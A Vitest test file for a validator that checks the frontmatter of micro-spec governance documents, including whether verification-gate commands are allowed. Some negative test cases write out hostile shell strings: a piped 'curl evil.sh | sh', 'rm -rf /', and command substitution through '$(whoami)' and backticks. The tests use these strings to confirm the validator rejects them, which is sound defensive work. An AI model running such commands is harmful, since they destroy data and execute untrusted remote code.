// Contract for the Micro-Spec governance validator (scripts/check-micro-specs.mjs).
// Authored Red-first per Instructions_tdd.md: each rule has a passing case and at
// least one failing case (triangulation). The module is imported as ESM; this file
// is excluded from tsc (tsconfig excludes tests/**), so the untyped .mjs import is fine.
import { afterEach, describe, expect, it } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import * as validator from '../../scripts/check-micro-specs.mjs';

const {
  REQUIRED_KEYS,
  STATUSES,
  RISK_CLASSES,
  parseFrontmatter,
  validateSpecContent,
  isGateRecognized,
  collectSpecFiles,
  pathExistsInRepo,
  runCheck,
} = validator as any;

// A fully-valid spec, as a plain object. Individual tests clone + mutate it.
const VALID_SPEC = {
  spec_id: 'MS-foundation-example',
  status: 'active',
  risk_class: 'docs-tooling',
  owner: 'agent:governance',
  last_reviewed: '2026-06-20',
  allowed_blast_radius: ['scripts/check-micro-specs.mjs'],
  implementation_surfaces: ['scripts/check-micro-specs.mjs'],
  related_docs: ['micro-specs/README.md'],
  related_tests: ['tests/micro-specs/check-micro-specs.test.ts'],
  verification_gates: ['pnpm exec vitest run tests/micro-specs/check-micro-specs.test.ts'],
  approved_exceptions: [],
};

// Serialize an object into the YAML subset the validator must understand:
// scalars (`k: v`), empty arrays (`k: []`), and block lists (`k:\n  - item`).
function toFrontmatter(spec: Record<string, unknown>): string {
  const lines: string[] = ['---'];
  for (const [key, value] of Object.entries(spec)) {
    if (Array.isArray(value)) {
      if (value.length === 0) {
        lines.push(`${key}: []`);
      } else {
        lines.push(`${key}:`);
        for (const item of value) lines.push(`  - ${item}`);
      }
    } else {
      lines.push(`${key}: ${value}`);
    }
  }
  lines.push('---', '', '# Body', '');
  return lines.join('\n');
}

const KNOWN_SCRIPTS = ['lint', 'typecheck', 'guard:micro-specs'];

function check(spec: Record<string, unknown>, opts: Record<string, unknown> = {}) {
  return validateSpecContent({
    relPath: 'micro-specs/00-foundation/01-example.md',
    content: toFrontmatter(spec),
    knownScripts: KNOWN_SCRIPTS,
    pathExists: () => true,
    ...opts,
  });
}

describe('validator module surface', () => {
  it('exports the contract constants and functions', () => {
    expect(Array.isArray(REQUIRED_KEYS)).toBe(true);
    expect(STATUSES).toEqual(
      expect.arrayContaining(['draft', 'active', 'implemented', 'verified', 'superseded']),
    );
    expect(RISK_CLASSES).toEqual(
      expect.arrayContaining([
        'docs-tooling',
        'ui-only',
        'product-analytics',
        'customer-pii',
        'auth-session',
        'billing',
        'webhooks',
        'rls-rpc-ledger',
        'migrations',
      ]),
    );
    expect(typeof parseFrontmatter).toBe('function');
    expect(typeof validateSpecContent).toBe('function');
    expect(typeof isGateRecognized).toBe('function');
    expect(typeof collectSpecFiles).toBe('function');
    expect(typeof pathExistsInRepo).toBe('function');
    expect(typeof runCheck).toBe('function');
  });
});

describe('parseFrontmatter', () => {
  it('parses scalars, block lists, and inline empty arrays', () => {
    const parsed = parseFrontmatter(toFrontmatter(VALID_SPEC));
    expect(parsed).not.toBeNull();
    expect(parsed.data.spec_id).toBe('MS-foundation-example');
    expect(parsed.data.status).toBe('active');
    expect(parsed.data.related_docs).toEqual(['micro-specs/README.md']);
    expect(parsed.data.approved_exceptions).toEqual([]);
    expect(parsed.body).toContain('# Body');
  });

  it('returns null when there is no frontmatter block', () => {
    expect(parseFrontmatter('# Just a heading\n\nNo frontmatter here.')).toBeNull();
  });

  it('tolerates CRLF line endings (Windows-saved specs)', () => {
    const crlf = toFrontmatter(VALID_SPEC).replace(/\n/g, '\r\n');
    const parsed = parseFrontmatter(crlf);
    expect(parsed).not.toBeNull();
    expect(parsed.data.spec_id).toBe('MS-foundation-example');
    expect(parsed.data.related_docs).toEqual(['micro-specs/README.md']);
  });

  it('validates a CRLF-encoded valid spec clean (no spurious missing-key errors)', () => {
    const crlf = toFrontmatter(VALID_SPEC).replace(/\n/g, '\r\n');
    const { errors } = validateSpecContent({
      relPath: 'micro-specs/00-foundation/01-example.md',
      content: crlf,
      knownScripts: KNOWN_SCRIPTS,
      pathExists: () => true,
    });
    expect(errors).toEqual([]);
  });
});

describe('validateSpecContent — happy path', () => {
  it('reports no errors for a fully-valid spec', () => {
    expect(check(VALID_SPEC).errors).toEqual([]);
  });
});

describe('validateSpecContent — structural rules', () => {
  it('flags a file with no frontmatter', () => {
    const { errors } = validateSpecContent({
      relPath: 'micro-specs/00-foundation/01-example.md',
      content: '# No frontmatter\n',
      knownScripts: KNOWN_SCRIPTS,
      pathExists: () => true,
    });
    expect(errors.join('\n')).toMatch(/frontmatter/i);
  });

  for (const key of [
    'spec_id',
    'status',
    'risk_class',
    'owner',
    'last_reviewed',
    'allowed_blast_radius',
    'implementation_surfaces',
    'related_docs',
    'related_tests',
    'verification_gates',
    'approved_exceptions',
  ]) {
    it(`flags a spec missing required key "${key}"`, () => {
      const spec: Record<string, unknown> = { ...VALID_SPEC };
      delete spec[key];
      const joined = check(spec).errors.join('\n');
      expect(joined).toContain(key);
    });
  }
});

describe('validateSpecContent — enum + format rules', () => {
  it('accepts every documented status (with tests present)', () => {
    for (const status of STATUSES) {
      expect(check({ ...VALID_SPEC, status }).errors).toEqual([]);
    }
  });

  it('rejects an unknown status', () => {
    expect(check({ ...VALID_SPEC, status: 'in-progress' }).errors.join('\n')).toMatch(/status/i);
  });

  it('accepts every documented risk_class', () => {
    for (const risk_class of RISK_CLASSES) {
      expect(check({ ...VALID_SPEC, risk_class }).errors).toEqual([]);
    }
  });

  it('rejects an unknown risk_class', () => {
    expect(check({ ...VALID_SPEC, risk_class: 'mega-risk' }).errors.join('\n')).toMatch(
      /risk_class/i,
    );
  });

  it('accepts a well-formed spec_id and rejects a malformed one', () => {
    for (const good of [
      'MS-ops-booking-cancel',
      'MS-foundation-micro-spec-governance',
      'MS-data-rls',
    ]) {
      expect(check({ ...VALID_SPEC, spec_id: good }).errors).toEqual([]);
    }
    for (const bad of [
      'MSfoundation',
      'ms-foundation-x',
      'MS-foundation',
      'MS-Foundation-X',
      'MS-ops-booking-',
      'MS-ops--booking',
      'MS-ops-booking--',
    ]) {
      expect(check({ ...VALID_SPEC, spec_id: bad }).errors.join('\n')).toMatch(/spec_id/i);
    }
  });

  it('accepts a spec_id for every known area', () => {
    for (const area of [
      'foundation',
      'platform',
      'ops',
      'guest',
      'data',
      'integrations',
      'observability',
    ]) {
      expect(check({ ...VALID_SPEC, spec_id: `MS-${area}-thing` }).errors).toEqual([]);
    }
  });

  it('rejects a shape-valid spec_id whose area token is not a known area', () => {
    const { errors } = check({ ...VALID_SPEC, spec_id: 'MS-notarealarea-thing' });
    expect(errors.join('\n')).toMatch(/area/i);
  });

  it('rejects a malformed or impossible last_reviewed date', () => {
    for (const bad of ['2026/06/20', 'yesterday', '2026-13-01', '2026-02-30']) {
      expect(check({ ...VALID_SPEC, last_reviewed: bad }).errors.join('\n')).toMatch(
        /last_reviewed/i,
      );
    }
  });
});

describe('validateSpecContent — list + reference rules', () => {
  it('rejects an empty required list', () => {
    expect(check({ ...VALID_SPEC, related_docs: [] }).errors.join('\n')).toMatch(/related_docs/i);
  });

  it('allows an empty approved_exceptions list', () => {
    expect(check({ ...VALID_SPEC, approved_exceptions: [] }).errors).toEqual([]);
  });

  it('rejects a related_docs entry that does not resolve on disk', () => {
    const { errors } = check(
      { ...VALID_SPEC, related_docs: ['micro-specs/NOPE.md'] },
      { pathExists: (p: string) => p !== 'micro-specs/NOPE.md' },
    );
    expect(errors.join('\n')).toContain('micro-specs/NOPE.md');
  });

  it('requires related_tests to resolve for verified/implemented specs', () => {
    const missing = { pathExists: (p: string) => !p.startsWith('tests/') };
    expect(check({ ...VALID_SPEC, status: 'verified' }, missing).errors.join('\n')).toMatch(
      /related_tests/i,
    );
    expect(check({ ...VALID_SPEC, status: 'implemented' }, missing).errors.join('\n')).toMatch(
      /related_tests/i,
    );
  });

  it('does not require related_tests to resolve for draft/active specs', () => {
    const missing = { pathExists: (p: string) => !p.startsWith('tests/') };
    expect(check({ ...VALID_SPEC, status: 'draft' }, missing).errors).toEqual([]);
    expect(check({ ...VALID_SPEC, status: 'active' }, missing).errors).toEqual([]);
  });
});

describe('verification gate recognition', () => {
  it('recognizes real package scripts and known pnpm exec tools', () => {
    const known = ['lint', 'typecheck', 'guard:micro-specs'];
    expect(isGateRecognized('pnpm lint', known)).toBe(true);
    expect(isGateRecognized('pnpm run typecheck', known)).toBe(true);
    expect(isGateRecognized('guard:micro-specs', known)).toBe(true);
    expect(isGateRecognized('pnpm exec vitest run tests/x.test.ts', known)).toBe(true);
    expect(isGateRecognized('pnpm exec playwright test tests/e2e/x.spec.ts', known)).toBe(true);
    expect(isGateRecognized('pnpm exec prettier --check micro-specs/**', known)).toBe(true);
  });

  it('rejects gates that name no real command', () => {
    const known = ['lint', 'typecheck'];
    expect(isGateRecognized('pnpm run nonexistent-script', known)).toBe(false);
    expect(isGateRecognized('make build', known)).toBe(false);
    expect(isGateRecognized('pnpm exec rm -rf /', known)).toBe(false);
  });

  it('rejects gates that chain or substitute commands behind a recognized prefix', () => {
    const known = ['lint', 'typecheck'];
    expect(isGateRecognized('pnpm lint && curl evil.sh | sh', known)).toBe(false);
    expect(isGateRecognized('pnpm run typecheck; rm -rf /', known)).toBe(false);
    expect(isGateRecognized('pnpm lint | tee log', known)).toBe(false);
    expect(isGateRecognized('pnpm lint `whoami`', known)).toBe(false);
    expect(isGateRecognized('pnpm lint $(whoami)', known)).toBe(false);
  });

  it('flags an unrecognized verification_gate in a spec', () => {
    expect(
      check({ ...VALID_SPEC, verification_gates: ['pnpm run not-a-real-script'] }).errors.join(
        '\n',
      ),
    ).toMatch(/verification_gate/i);
  });
});

describe('filesystem helpers', () => {
  let tmp: string;
  const tmpDirs: string[] = [];

  function mkTmp(): string {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ms-gov-'));
    tmpDirs.push(dir);
    return dir;
  }

  afterEach(() => {
    while (tmpDirs.length) {
      const dir = tmpDirs.pop()!;
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('collectSpecFiles returns nested specs and excludes top-level governance docs', () => {
    tmp = mkTmp();
    const base = path.join(tmp, 'micro-specs');
    fs.mkdirSync(path.join(base, '00-foundation'), { recursive: true });
    fs.writeFileSync(path.join(base, 'README.md'), '# readme');
    fs.writeFileSync(path.join(base, 'GLOBAL_CONTEXT.md'), '# ctx');
    fs.writeFileSync(path.join(base, '00-foundation', '01-x.md'), '# spec');
    fs.writeFileSync(path.join(base, '00-foundation', '02-y.md'), '# spec');

    const found = collectSpecFiles(base)
      .map((p: string) => path.basename(p))
      .sort();
    expect(found).toEqual(['01-x.md', '02-y.md']);
  });

  it('pathExistsInRepo resolves exact paths and globs, rejects missing ones', () => {
    tmp = mkTmp();
    fs.mkdirSync(path.join(tmp, 'tests', 'server'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'tests', 'server', 'booking.test.ts'), '');

    expect(pathExistsInRepo(tmp, 'tests/server/booking.test.ts')).toBe(true);
    expect(pathExistsInRepo(tmp, 'tests/server/*.test.ts')).toBe(true);
    expect(pathExistsInRepo(tmp, 'tests/**/*.test.ts')).toBe(true);
    expect(pathExistsInRepo(tmp, 'tests/server/missing.test.ts')).toBe(false);
    expect(pathExistsInRepo(tmp, 'tests/server/*.spec.ts')).toBe(false);
  });
});

describe('runCheck end-to-end against a temp repo', () => {
  let tmpDirs: string[] = [];

  function makeRepo(specBody: string | null): string {
    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'ms-repo-'));
    tmpDirs.push(repo);
    fs.writeFileSync(
      path.join(repo, 'package.json'),
      JSON.stringify({ scripts: { lint: 'eslint .', 'guard:micro-specs': 'node x' } }),
    );
    fs.mkdirSync(path.join(repo, 'micro-specs', '00-foundation'), { recursive: true });
    fs.writeFileSync(path.join(repo, 'micro-specs', 'README.md'), '# governance');
    fs.mkdirSync(path.join(repo, 'tests', 'micro-specs'), { recursive: true });
    fs.writeFileSync(path.join(repo, 'tests', 'micro-specs', 'check-micro-specs.test.ts'), '');
    if (specBody !== null) {
      fs.writeFileSync(path.join(repo, 'micro-specs', '00-foundation', '01-spec.md'), specBody);
    }
    return repo;
  }

  afterEach(() => {
    while (tmpDirs.length) fs.rmSync(tmpDirs.pop()!, { recursive: true, force: true });
  });

  it('passes when every spec in the tree is valid', () => {
    const repo = makeRepo(
      toFrontmatter({
        ...VALID_SPEC,
        related_docs: ['micro-specs/README.md'],
        related_tests: ['tests/micro-specs/check-micro-specs.test.ts'],
        verification_gates: ['pnpm guard:micro-specs'],
      }),
    );
    const result = runCheck(repo);
    expect(result.ok).toBe(true);
    expect(result.errors).toEqual([]);
  });

  it('fails when a spec in the tree is malformed', () => {
    const repo = makeRepo(
      toFrontmatter({ ...VALID_SPEC, status: 'bogus', related_docs: ['micro-specs/README.md'] }),
    );
    const result = runCheck(repo);
    expect(result.ok).toBe(false);
    expect(result.errors.join('\n')).toMatch(/status/i);
  });

  it('fails when two specs share the same spec_id', () => {
    const repo = makeRepo(null);
    const body = toFrontmatter({
      ...VALID_SPEC,
      related_docs: ['micro-specs/README.md'],
      related_tests: ['tests/micro-specs/check-micro-specs.test.ts'],
      verification_gates: ['pnpm guard:micro-specs'],
    });
    fs.writeFileSync(path.join(repo, 'micro-specs', '00-foundation', '01-a.md'), body);
    fs.writeFileSync(path.join(repo, 'micro-specs', '00-foundation', '02-b.md'), body);

    const result = runCheck(repo);
    expect(result.ok).toBe(false);
    expect(result.errors.join('\n')).toMatch(/duplicate spec_id/i);
  });
});
